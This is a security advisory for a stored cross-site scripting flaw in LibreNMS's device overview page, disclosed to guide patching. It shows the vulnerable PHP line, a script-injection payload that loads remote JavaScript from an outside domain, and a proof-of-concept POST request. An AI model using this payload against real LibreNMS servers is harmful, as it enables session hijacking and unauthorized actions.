# Stored XSS ('Cross-site Scripting') in librenms/includes/html/dev-overview-data.inc.php

High

[murrant](/murrant)
published
GHSA-p66q-ppwr-q5j8
Nov 15, 2024

## Package

librenms/includes/html/dev-overview-data.inc.php
(LibreNMS)

## Affected versions

<= 24.9.1

## Patched versions

24.10.0

## Description

### Summary

A Stored Cross-Site Scripting (XSS) vulnerability in the Device Overview page allows authenticated users to inject arbitrary JavaScript through the "overwrite\_ip" parameter when editing a device. This vulnerability results in the execution of malicious code when the device overview page is visited, potentially compromising the accounts of other users.

### Details

The vulnerability occurs when editing a device. An attacker can inject arbitrary JavaScript into the "overwrite\_ip" parameter. This malicious script is then executed in the "Assigned IP" field when the device overview page is loaded.

The payload used to exploit this vulnerability is: `test'"><script src=//15.rs></script>`

Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.

The root cause of this vulnerability is the application's failure to properly sanitize the "overwrite\_ip" value before including it in the HTML output. This is evident in the following line of code:

[librenms/includes/html/dev-overview-data.inc.php](https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/dev-overview-data.inc.php#L42)

Line 42
in
[7f2ae97](/librenms/librenms/commit/7f2ae971c4a565b0d7345fa78b4211409f96800a)

|  | echo "<div class='row'><div class='col-sm-4'>Assigned IP</div><div class='col-sm-8'>{$device['overwrite\_ip']}</div></div>"; |
| --- | --- |

### PoC

1. Edit a device and use the following payload in the "overwrite\_ip" parameter: `test'"><script src=//15.rs></script>`
2. Save the changes.
3. Navigate to the device overview page.
4. Observe that the injected script executes in the "Assigned IP" field.

```
POST /device/14/edit HTTP/1.1
Host: <your_host>
Content-Type: application/x-www-form-urlencoded
Cookie: <your_cookie>

_token=<your_token>&editing=yes&display=&overwrite_ip=test'"><script+src=//15.rs></script>&descr=&type=&parent_id%5B%5D=15&Submit=
```
### Impact

This vulnerability allows authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. Compromised accounts could lead to unauthorized actions being taken on behalf of the impacted users.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
